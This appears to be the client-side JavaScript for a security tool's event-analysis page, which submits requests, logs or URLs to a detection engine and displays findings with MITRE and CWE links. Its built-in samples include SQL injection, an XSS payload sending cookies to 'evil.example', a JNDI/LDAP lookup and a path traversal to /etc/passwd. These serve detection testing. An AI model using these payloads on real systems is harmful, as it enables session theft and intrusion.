// Analyze Event: run text through the detection engine and explain every finding.
(() => {
    const MAX_INPUT = 10000;
    const PREFILL_KEY = "cs:analyze-prefill";
    const SAMPLES = {
        sqli: { type: "request", data: "GET /products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\nHost: shop.example.com\nUser-Agent: sqlmap/1.7.2" },
        xss: { type: "url", data: "https://app.example.com/search?q=<script>fetch('//evil.example/c?'+document.cookie)</script>" },
        jndi: { type: "request", data: "GET / HTTP/1.1\nHost: api.example.com\nX-Api-Version: ${jndi:ldap://203.0.113.7:1389/a}" },
        traversal: { type: "request", data: "GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\nHost: files.example.com" },
        brute: { type: "log", data: "Nov  7 02:14:51 web01 sshd[2231]: Failed password for invalid user admin from 198.51.100.23 port 52344 ssh2\nNov  7 02:14:53 web01 sshd[2231]: Failed password for invalid user admin from 198.51.100.23 port 52344 ssh2" },
        benign: { type: "request", data: "GET /api/v1/products?page=2&sort=price HTTP/1.1\nHost: shop.example.com\nUser-Agent: Mozilla/5.0" },
    };

    const { el, badge, formatNumber, tone, titleCase } = window.csUI;
    const $ = id => document.getElementById(id);
    const form = $("analyzeForm");
    const input = $("eventInput");
    const typeSelect = $("eventType");
    const analyzeBtn = $("analyzeBtn");
    const rules = new Map();
    let latestSiteReport = null;

    function updateMode() {
        const isUrl = typeSelect.value === "url";
        $("eventInputLabel").textContent = isUrl ? "Website URL to scan" : "Event data";
        input.placeholder = isUrl ? "https://example.com" : "GET /search?q=... HTTP/1.1";
        analyzeBtn.textContent = isUrl ? "Scan website" : "Analyze event";
        $("inputHelp").childNodes[0].textContent = isUrl ? "Checks the public website's TLS, headers, cookies and page content." : "Don't paste passwords, API keys or other secrets. ";
    }

    const externalLink = (href, text, className) =>
        el("a", { href, text, class: className, target: "_blank", rel: "noopener noreferrer" });
    const mitreUrl = id => `https://attack.mitre.org/techniques/${id.replace(".", "/")}/`;
    const cweUrl = cwe => {
        const number = String(cwe || "").match(/CWE-(\d+)/)?.[1];
        return number ? `https://cwe.mitre.org/data/definitions/${number}.html` : null;
    };

    // ---------- input ----------

    function updateCharCount() {
        const length = input.value.length;
        $("charCount").textContent = `${formatNumber(length)} / ${formatNumber(MAX_INPUT)}`;
        const value = input.value.trim();
        const warning = $("inputWarning");
        warning.hidden = !(typeSelect.value === "url" && value && !/^https?:\/\//i.test(value));
        warning.textContent = "This doesn't look like a full http(s) URL, but it will still be analyzed.";
    }

    function showError(message) {
        $("formError").textContent = message;
        $("formError").hidden = !message;
        input.setAttribute("aria-invalid", String(Boolean(message)));
    }

    function fill(data, type) {
        input.value = data;
        // Stored events use e.g. "manual_request" or "security_event"; map onto the select's options.
        const option = String(type || "").replace(/^manual_/, "");
        typeSelect.value = [...typeSelect.options].some(o => o.value === option) ? option : "general";
        updateCharCount();
        showError("");
        input.focus();
    }

    // ---------- result ----------

    function renderFinding(finding) {
        const tags = el("div", { class: "tags" },
            el("span", { class: "tag", text: finding.category }),
            el("span", { class: "tag", text: `+${finding.weight}` }),
            finding.mitre && externalLink(mitreUrl(finding.mitre), finding.mitre, "tag"),
            cweUrl(finding.cwe) && externalLink(cweUrl(finding.cwe), finding.cwe, "tag"),
            finding.decoded && el("span", { class: "tag", text: finding.decoding }));

        const evidence = el("div", { class: "evidence" });
        if (finding.evidence && finding.evidence.length) {
            evidence.append(el("span", { class: "label", text: `Matched text${finding.match_count > 1 ? ` (${finding.match_count} matches)` : ""}` }));
            finding.evidence.forEach(item => evidence.append(el("pre", {}, item.before, el("mark", { text: item.match }), item.after)));
        } else {
            evidence.hidden = true;
        }

        return el("article", { class: "finding" },
            el("div", { class: "finding-head" },
                el("div", {}, el("h4", { text: finding.name }), el("code", { text: finding.rule_id })),
                tags),
            evidence,
            el("p", { class: "finding-text" }, el("strong", { text: "Why it matters: " }), finding.description),
            el("p", { class: "finding-text" }, el("strong", { text: "What to do: " }), finding.remediation));
    }

    function renderResult(result, alertId, eventId) {
        latestSiteReport = null;
        $("reportActions").hidden = true;
        const level = result.risk_level;
        const findings = result.findings || [];
        $("resultPanel").hidden = false;
        $("scoreRing").style.setProperty("--score", result.risk_score);
        $("scoreRing").className = `score-ring tone-${tone(level)}`;
        $("scoreValue").textContent = result.risk_score;
        $("riskBadge").replaceWith(Object.assign(badge(level, `${level} RISK`), { id: "riskBadge" }));
        $("resultMeta").textContent = `${result.engine} · ${new Date().toLocaleTimeString()}`;
        $("verdictTitle").textContent = findings.length
            ? `${findings.length} threat indicator${findings.length > 1 ? "s" : ""} found`
            : "No threat indicators found";
        $("recommendation").textContent = result.recommendation;

        const alertLink = $("alertLink");
        alertLink.replaceChildren();
        if (alertId) {
            alertLink.append(`Alert #${alertId} was added to your queue. `,
                el("a", { href: "../app.html#/alerts", text: "Open Security Alerts →" }));
        } else {
            alertLink.textContent = `Saved as event #${eventId}. No alert was needed.`;
        }

        const container = $("findings");
        container.replaceChildren();
        if (!findings.length) {
            container.append(el("p", { class: "muted", text: "This event did not match any active rule. Rule-based detection cannot rule out new or heavily obfuscated attacks." }));
        }
        findings.forEach(finding => container.append(renderFinding(finding)));
        $("resultPanel").scrollIntoView({ behavior: "smooth", block: "start" });
    }

    function renderSiteReport(report) {
        latestSiteReport = report;
        const findings = report.checks.filter(check => check.status === "fail" || check.status === "warn");
        $("resultPanel").hidden = false;
        $("scoreRing").style.setProperty("--score", report.risk_score);
        $("scoreRing").className = `score-ring tone-${tone(report.risk_level)}`;
        $("scoreValue").textContent = report.risk_score;
        $("riskBadge").replaceWith(Object.assign(badge(report.risk_level, `${report.risk_level} RISK`), { id: "riskBadge" }));
        $("resultMeta").textContent = `${report.url} · Grade ${report.grade} · HTTP ${report.status_code}`;
        $("verdictTitle").textContent = `${findings.length} website issue${findings.length === 1 ? "" : "s"} found`;
        $("recommendation").textContent = findings.length ? `${findings.length} security recommendation${findings.length === 1 ? "" : "s"} below.` : "No issues detected by these passive checks.";
        $("alertLink").textContent = report.alert_id ? `Alert #${report.alert_id} added to your queue.` : `Saved as event #${report.event_id}.`;
        const container = $("findings");
        container.replaceChildren();
        if (!findings.length) container.append(el("p", { class: "muted", text: "No issues were found in the checks performed." }));
        findings.forEach(check => container.append(el("article", { class: "finding" },
            el("div", { class: "finding-head" }, el("h4", { text: check.title }), el("span", { class: "tag", text: check.status.toUpperCase() })),
            el("p", { class: "finding-text", text: check.detail }),
            check.fix && el("p", { class: "finding-text" }, el("strong", { text: "Recommendation: " }), check.fix))));
        $("reportActions").hidden = false;
        $("resultPanel").scrollIntoView({ behavior: "smooth", block: "start" });
    }

    // ---------- submit ----------

    form.addEventListener("submit", async event => {
        event.preventDefault();
        showError("");
        const value = input.value.trim();
        if (!value) {
            showError("Enter event data to analyze, or pick a sample above.");
            input.focus();
            return;
        }
        if (value.length > MAX_INPUT) {
            showError("Event data must be 10,000 characters or fewer.");
            return;
        }
        analyzeBtn.disabled = true;
        analyzeBtn.classList.add("is-loading");
        analyzeBtn.textContent = "Analyzing…";
        try {
            if (typeSelect.value === "url") {
                const data = await apiJson("/api/site-check", { method: "POST", body: { url: value } });
                renderSiteReport(data.report);
                if (data.report.alert_id && window.csNotifyChanged) window.csNotifyChanged();
            } else {
                const data = await apiJson("/api/assess-risk", {
                    method: "POST", body: { event_data: value, event_type: typeSelect.value },
                });
                renderResult(data.result, data.alert_id, data.event_id);
                if (data.alert_id) {
                    csUI.toast(`${titleCase(data.result.risk_level)} alert #${data.alert_id} created.`, { tone: "warning" });
                    if (window.csNotifyChanged) window.csNotifyChanged();
                }
            }
        } catch (error) {
            showError(`Could not analyze the event: ${error.message}`);
        } finally {
            analyzeBtn.disabled = false;
            analyzeBtn.classList.remove("is-loading");
            updateMode();
        }
    });

    input.addEventListener("input", () => { updateCharCount(); showError(""); });
    typeSelect.addEventListener("change", () => { updateCharCount(); updateMode(); });
    $("downloadReportBtn").addEventListener("click", async () => {
        if (!latestSiteReport) return;
        const button = $("downloadReportBtn");
        button.disabled = true;
        try {
            const response = await window.apiFetch("/api/site-check/report", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ report: latestSiteReport }) });
            if (!response.ok) throw new Error("Could not create PDF report.");
            const blob = await response.blob();
            const link = document.createElement("a");
            link.href = URL.createObjectURL(blob); link.download = "website-security-report.pdf"; link.click();
            URL.revokeObjectURL(link.href);
        } catch (error) { csUI.toast(error.message, { tone: "danger" }); }
        finally { button.disabled = false; }
    });
    input.addEventListener("keydown", event => {
        if (event.key === "Enter" && (event.ctrlKey || event.metaKey)) form.requestSubmit();
    });
    $("clearBtn").addEventListener("click", () => {
        fill("", "general");
        $("resultPanel").hidden = true;
    });
    $("samples").addEventListener("click", event => {
        const sample = SAMPLES[event.target.dataset?.sample];
        if (sample) fill(sample.data, sample.type);
    });

    // ---------- rule catalog ----------

    async function loadRules() {
        try {
            const data = await apiJson("/api/detection/rules");
            const body = $("catalogBody");
            body.replaceChildren();
            data.rules.forEach(rule => {
                rules.set(rule.id, rule);
                const cwe = cweUrl(rule.cwe);
                body.append(el("tr", {},
                    el("td", {}, el("strong", { text: rule.name }), el("code", { text: rule.id }), el("p", { class: "muted", text: rule.description })),
                    el("td", { text: rule.category }),
                    el("td", { class: "num", text: `+${rule.weight}` }),
                    el("td", {}, externalLink(mitreUrl(rule.mitre), rule.mitre), el("p", { class: "muted", text: rule.mitre_name })),
                    el("td", {}, cwe ? externalLink(cwe, rule.cwe) : el("span", { class: "muted", text: rule.cwe }))));
            });
            $("catalogCount").textContent = `· ${data.rules.length} active rules · ${data.engine.name} v${data.engine.version}`;
        } catch (_error) {
            $("catalogCount").textContent = "· unavailable";
        }
    }

    // ---------- boot: sample from the URL or text handed over by another page ----------

    const params = new URLSearchParams(window.location.search);
    if (SAMPLES[params.get("sample")]) {
        const sample = SAMPLES[params.get("sample")];
        fill(sample.data, sample.type);
    }
    try {
        const prefill = JSON.parse(sessionStorage.getItem(PREFILL_KEY) || "null");
        sessionStorage.removeItem(PREFILL_KEY);
        if (prefill && typeof prefill.data === "string") fill(prefill.data, prefill.type);
    } catch (_error) { /* ignore malformed handoff */ }
    if (params.get("rules") === "1") $("ruleCatalog").open = true;

    updateCharCount();
    updateMode();
    loadRules();
})();
